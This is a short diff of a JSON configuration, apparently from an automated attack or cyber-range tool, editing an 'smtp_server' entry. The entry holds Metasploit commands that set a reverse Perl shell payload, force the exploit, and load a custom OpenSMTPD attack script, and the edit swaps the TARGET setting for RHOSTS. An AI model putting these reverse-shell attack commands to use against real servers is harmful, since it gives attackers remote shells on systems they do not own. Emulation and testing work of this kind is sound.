@@ -12,7 +12,7 @@
         "wait_time": "25"
       },
       "smtp_server": {
-        "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set TARGET {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
+        "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set RHOSTS {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "60"
         
